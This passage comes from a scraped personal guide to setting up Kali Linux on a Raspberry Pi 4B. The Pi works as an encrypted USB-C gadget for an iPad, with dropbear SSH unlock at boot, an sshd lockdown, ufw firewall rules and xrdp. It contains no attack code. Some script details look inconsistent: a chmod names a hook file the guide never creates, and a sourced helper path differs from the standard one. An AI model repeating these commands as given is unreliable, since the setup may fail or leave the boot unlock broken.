the\n# encrypted microSD card, or just copying\n# ~/.ssh/authorized_keys (and making sure that the permissions\n# are right!). You do you.\n#\n# That said!\n#\n# As a fan of per-host keys I&#039;m not in love with this step,\n# since it means that if I reset my iPad then I need an\n# external keyboard to unlock the Pi before I can copy over\n# the new public key. Unfortunately, I don&#039;t see any way to\n# support a password-based login (which I think is &quot;secure\n# enough&quot; in here for the same reason that I think that\n# re-using the SSH host keys is &quot;secure enough&quot; in this\n# particular context) without modifying dropbear&#039;s initramfs\n# setup hook (which I&#039;d rather not do, as any changes will be\n# overwritten if the dropbear-initramfs package is updated).\n \n# Add dropbear configuration options. In particular, for an\n# unlock of ROOTFS on successful login.\n#\nsed -i -e &#039;s;^#DROPBEAR_OPTIONS=$;DROPBEAR_OPTIONS=&quot;-jks -c /usr/bin/cryptroot-unlock-ssh&quot;;&#039; /etc/dropbear/initramfs/config\n \n# Drop permissions.\n#\nexit\nCreate /usr/local/sbin/cryptroot-unlock-ssh.sh:\n#!/bin/sh\n \nROOTFS_DEV=crypt_rootfs\n \nif [ ! -b /dev/mapper/$ROOTFS_DEV ]; then\n\tif [ -f /cryptroot/crypttab ]; then\n\t\tROOTFS_UID=&quot;`grep $ROOTFS_DEV /cryptroot/crypttab | cut -d &#039; &#039; -f 2`&quot;\n\telif [ -f /etc/crypttab ]; then\n\t\tROOTFS_UID=&quot;`grep $ROOTFS_DEV /etc/crypttab | cut -f 2`&quot;\n\telse\n\t\texit\n\tfi\n \n\t/usr/sbin/cryptsetup luksOpen $ROOTFS_UID $ROOTFS_DEV &amp;&amp; killall cryptroot\nfi\nCreate /usr/share/initramfs-tools/hooks/cryptroot-unlock-ssh:\n#!/bin/sh\n \nPREREQ=&quot;&quot;\n \nprereqs() {\n\techo &quot;$PREREQ&quot;\n}\n \ncase &quot;$1&quot; in\n\tprereqs)\n\t\tprereqs\n\t\texit 0\n\t;;\nesac\n \n. /usr/share/initramfs-tools/hooks-functions\n \ncopy_file script /usr/local/sbin/cryptroot-unlock-ssh.sh /usr/bin/cryptroot-unlock-ssh\nCreate /usr/share/initramfs-tools/hooks/ipad:\n#!/bin/sh\n \nPREREQ=&quot;&quot;\n \nprereqs() {\n\techo &quot;$PREREQ&quot;\n}\n \ncase &quot;$1&quot; in\n\tprereqs)\n\t\tprereqs\n\t\texit 0\n\t;;\nesac\n \n. /usr/share/initramfs-tools/hooks-functions\n \nmanual_add_modules dwc2 libcomposite usb_f_ecm\ncopy_file script /usr/local/sbin/usb0up.sh /usr/sbin/usb0up.sh\ncopy_file script /usr/local/sbin/usb0down.sh /usr/sbin/usb0down.sh\n \ncopy_exec /usr/sbin/dnsmasq\ncopy_file config /etc/dnsmasq.d/ipad /etc/dnsmasq.conf\nCreate /usr/share/initramfs-tools/scripts/init-top/ipad:\n#!/bin/sh\n \nPREREQ=&quot;udev&quot;\n \nprereqs() {\n\techo &quot;$PREREQ&quot;\n}\n \ncase &quot;$1&quot; in\n\tprereqs)\n\t\tprereqs\n\t\texit 0\n\t;;\nesac\n \n. /scripts/functions\n \nmount -t configfs none /sys/kernel/config\n \n. /usr/sbin/usb0up.sh\n \nipconfig -d &quot;10.55.0.1:::255.255.255.248:kali:usb0&quot;\n \n/usr/sbin/dnsmasq --local-service --user=root --pid-file=/run/dnsmasq.pid\nCreate /usr/share/initramfs-tools/scripts/local-bottom/ipad:\n#!/bin/sh\n \nPREREQ=&quot;&quot;\n \nprereqs() {\n\techo &quot;$PREREQ&quot;\n}\n \ncase &quot;$1&quot; in\n\tprereqs)\n\t\tprereqs\n\t\texit 0\n\t;;\nesac\n \n. /scripts/functions\n \nkill -TERM `cat /run/dnsmasq.pid`\n \nip link set dev usb0 down\nip address flush dev usb0\nip route flush dev usb0\n \n. /usr/sbin/usb0down.sh\n \numount /sys/kernel/config\nFix up permissions and finish setting things up:\n# Become root.\n#\nsudo -s\n \n# Make sure that new initramfs-tools scripts are executable.\n#\nchmod +x /usr/local/sbin/cryptroot-unlock-ssh.sh\nchmod +x /usr/share/initramfs-tools/hooks/cryptroot-ssh\nchmod +x /usr/share/initramfs-tools/hooks/ipad\nchmod +x /usr/share/initramfs-tools/scripts/init-top/ipad\nchmod +x /usr/share/initramfs-tools/scripts/local-bottom/ipad\n \n# Regenerate initramfs.\n#\nmkinitramfs -o /boot/initramfs.zst $(ls -1 /lib/modules | grep -e &#039;-Re4son-v8l+$&#039; | sort | tail -1)\n \n# Drop permissions.\n#\nexit\nThird moment of truth: Reboot your system. After a few moments you should be able to SSH into it as root@10.55.0.1 (over USB C) and be prompted to unlock your root device. After you type in your decryption passphrase, SSH should automatically close and your system should continue to boot. In a few more moments you should be able to SSH back in as kali@10.55.0.1.\nYou can also still unlock the system at the console, which is handy if you want to use the Pi as a stand-alone computer.\nNote an annoying feature of this setup — you have to SSH in as root to do the initial unlock, but then will need to SSH in a second time as kali once the system is fully up. Partly, this is due to the fact that there’s not really a way to hand SSH off from the initram environment to the full system (this is why you have to log in once to unlock, and again to use the system once it’s fully up). Theoretically it should be possible to add a kali user to the initramfs, but doing so would require both the dropbear initramfs hooks to be modified (which, as previously mentioned, is fragile w.r.t. upgrades) and a lot more magic in generally than seems advisable.\nNetwork hardening\nNow that we’ve got the Pi working with our iPad, we’re going to lock down networking a bit\n# Become root.\n#\nsudo -s\n \n# Limit SSH access to the kali user over usb0.\n#\ncat &gt; /etc/ssh/sshd_config.d/lockdown.conf &lt;&lt; EOF\nAllowUsers kali\nListenAddress 10.55.0.1\nPermitRootLogin no\nEOF\nsystemctl restart sshd.service\n \n# Basic firewall.\n#\napt install gufw\nsystemctl start ufw.service\nufw default deny\nufw allow in on usb0 from 0.0.0.0/0 port 68 to 0.0.0.0/0 port 67 proto udp\nufw allow in on usb0 from 10.55.0.0/29 to 10.55.0.1 port 22 proto tcp\nufw enable\n \n# Drop permissions.\n#\nexit\nIf you’re going to be using this device covertly, you almost certainly also want to run sudo systemctl disable NetworkManager.service so that the Pi doesn’t attempt to immediately connect to whatever network you plug it into.\nRemote desktop\n# Become root.\n#\nsudo -s\n \n# Install xrdp.\n#\napt install xrdp\n \n# Turn off &quot;new&quot; cursors, as this causes problems with some\n# RDP clients. This isn&#039;t necessary if you&#039;re using Microsoft\n# Remote Desktop, but is required to avoid the cursor being\n# surrounded by a weird box on Jump Desktop. The trade-off\n# here is that the &quot;new&quot; cursors look really nice, while the\n# &quot;old&quot; cursors... Do not.\n#\nsed -i -e &#039;s/^new_cursors=true$/new_cursors=false/&#039; /etc/xrdp/xrdp.ini\n \n# Allow connections in over usb0.\n#\nufw allow in on usb0 from 10.55.0.0/29 to 10.55.0.1 port 3389 proto tcp\n \n# Enable xrdp.\n#\nsystemctl enable xrdp.service\n \n# Drop permissions.\n#\nexit\nYou should now be able to log in using RDP. Standard resolutions work well, but HiDPI/Retina is only marginally more responsive than a slideshow.\nAs with the dropbear configuration in the previous section, please do not set up RDP like I’m presenting here if you’re using a device that’s exposed to a larger network, or worse yet the internet as a whole. In the real world, RDP servers should only be accessible over SSH, a VPN, or some other secure wrapper — never exposed directly as we’re doing here. The reason we can get away with less is (again) because we’re only exposing RDP over the usb0 interface, and the only other device that ever lives on that network is the iPad.\n\n\n                  \n                  Tip\n                  \n                \n\n\nI use Jump Desktop as my RDP client, rather than Microsoft Remote Desktop — while Microsoft’s offering is overall nicer, Jump Desktop is faster and will connect even when the iPad’s Wi-Fi is disconnected (Microsoft will refuse to connect if Wi-Fi is disabled, even though the Pi is accessible via USB ethernet!).\n\n\n","richContent":"&lt;p&gt;This guide will cover setting up &lt;a href=&quot;https://www.kali.org/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Kali Linux&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; on a &lt;a href=&quot;https://www.raspberrypi.org/products/raspberry-pi-4-model-b/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Raspberry Pi 4B&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; so that:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;It can be used as a USB C “gadget” with an &lt;a href=&quot;https://www.apple.com/ipad-pro/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;iPad Pro&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (or similar device);&lt;/li&gt;\n&lt;li&gt;All files except for /boot are encrypted;&lt;/li&gt;\n&lt;li&gt;A full desktop environment is available on demand via RDP; and&lt;/li&gt;\n&lt;li&gt;The system &lt;em&gt;still&lt;/em&gt; works as a desktop device in a pinch (BYO keyboard, mouse, and monitor).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Be aware that this guide was written using the 64-bit 2021.2 Kali Linux image; YMMV with other images!&lt;/p&gt;\n&lt;p&gt;It should be possible to adapt the steps here for other Debian-based operating systems with a Raspberry Pi 4B compatible image. It should &lt;em&gt;also&lt;/em&gt; be possible to do this all in fewer steps; the guide below is split up in a very step-by-step fashion, and is in no way optimized for speed.&lt;/p&gt;\n&lt;h2 id=&quot;hardware-and-software&quot;&gt;Hardware and software&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#hardware-and-software&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Things you’ll want/need:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;A Raspberry Pi. (I use an &lt;a href=&quot;https://www.adafruit.com/product/4564&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;8 GB Raspberry Pi 4B&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.)&lt;/li&gt;\n&lt;li&gt;A good USB C cable. (The &lt;a href=&quot;https://www.amazon.com/dp/B07THFJ1J5&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;DockCase USB C cable&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is surprisingly great.)&lt;/li&gt;\n&lt;li&gt;A good microSD card. (I use a &lt;a href=&quot;https://www.kingston.com/en/memory-cards/canvas-go-plus-microsd-card&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;64 GB Kingston Canvass Go! Plus&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.)&lt;/li&gt;\n&lt;li&gt;A second “bootstrap” microSD card that’s at least 32 GB in size. (You need something &lt;em&gt;twice&lt;/em&gt; the size that your operating system image requires. This will just be used to “bootstrap” the encrypted microSD card, so it’s only necessary if you’re spinning the Pi up for the first time.)&lt;/li&gt;\n&lt;li&gt;A USB microSD card reader (since you’ll need to have &lt;em&gt;both&lt;/em&gt; microSD cards connected to the Pi briefly.)&lt;/li&gt;\n&lt;li&gt;Physical access to a Linux system. (This could actually be the Pi itself, if you’ve already got it up and running with another operating system.)&lt;/li&gt;\n&lt;li&gt;An HDMI monitor, microHDMI-to-HDMI cable, and a USB keyboard (only needed until we set up network access and USB gadget mode).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;create-the-bootstrap-microsd-if-necessary&quot;&gt;Create the bootstrap microSD (if necessary)&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#create-the-bootstrap-microsd-if-necessary&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If you’re setting the Pi up for the first time, you’ll need to burn a Kali Linux microSD card to bootstrap off of. (If you already have a working Pi, then this can be skipped.)&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Download the latest version of Kali Linux from&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# https://www.kali.org/get-kali/#kali-arm. Check that page to&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# see which file name you should be using here (2021.2 is&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# current at the time of this writing).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -O&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; https://images.kali.org/arm-images/kali-linux-2021.2-rpi4-nexmon-64.img.xz&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Check the sha256 hash to make sure you&#039;ve downloaded a good&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# file (the hash used below is for the 2021.2 image).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sha256sum&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; kali-linux-2021.2-rpi4-nexmon-64.img.xz&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tgrep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -E&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;^97549d9e24dbd73add004b9521874dff6351a6275428356e804b98eb9e842c99 &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; &amp;#x26;&amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SUCCESS - Download checksum looks good&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; ||&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;FAILURE - Download checksum doesn&#039;t match expected value; file corrupt or incorrect&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# /dev/mmcblk0 is the SD card device on my system; YMMV. Be&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# sure to use the right device here, or you can hose your&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# system! If your system automatically mounts partitions on&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# insert, then you&#039;ll need to unmount them before performing&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# this step.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xzcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; kali-linux-2021.2-rpi4-nexmon-64.img.xz&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; of=/dev/mmcblk0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; bs=4M&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; status=progress&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;There’s a small amount of free space on the Kali ROOTFS partition; it may be useful to drop any of the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; private keys here that you’ll eventually want to use to use to log into the Pi here to make it easier to copy them into the right locations later.&lt;/p&gt;\n&lt;p&gt;Pop the microSD card out, throw it in your Pi, boot up, log in. &lt;a href=&quot;https://www.kali.org/docs/introduction/default-credentials/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;The first-run username and password are both kali.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;We’ll need more space in ROOTFS than the Kali image provides out-of-the-box. The kalipi-config tool can make this happen, but unfortunately it doesn’t recognize the the 64-bit images as a Raspberry Pi! To fix this, you’ll need to edit /usr/bin/kalipi-config and hack the &lt;code&gt;is_pi()&lt;/code&gt; function so that it always returns 0. Once you’ve done this, run &lt;a href=&quot;https://raspberrypi.stackexchange.com/questions/46520/expand-file-system-kali-linux-on-sd-card-of-16gb/127378#127378&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;&lt;code&gt;sudo kalipi-config&lt;/code&gt;&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and use &lt;strong&gt;Advanced Options → Expand Filesystem&lt;/strong&gt; to reclaim the rest of your microSD card’s space.&lt;/p&gt;\n&lt;p&gt;You’re now ready to bootstrap your &lt;em&gt;actual&lt;/em&gt; system!&lt;/p&gt;\n&lt;h2 id=&quot;set-up-the-encrypted-microsd-sard&quot;&gt;Set up the encrypted microSD sard&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#set-up-the-encrypted-microsd-sard&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Download the latest version of Kali Linux from&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# https://www.kali.org/get-kali/#kali-arm. Check that page to&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# see which file name you should be using here (2021.2 is&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# current at the time of this writing).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -O&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; https://images.kali.org/arm-images/kali-linux-2021.2-rpi4-nexmon-64.img.xz&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Check the sha256 hash to make sure you&#039;ve downloaded a good&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# file (the hash used below is for the 2021.2 image).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sha256sum&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; kali-linux-2021.2-rpi4-nexmon-64.img.xz&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span 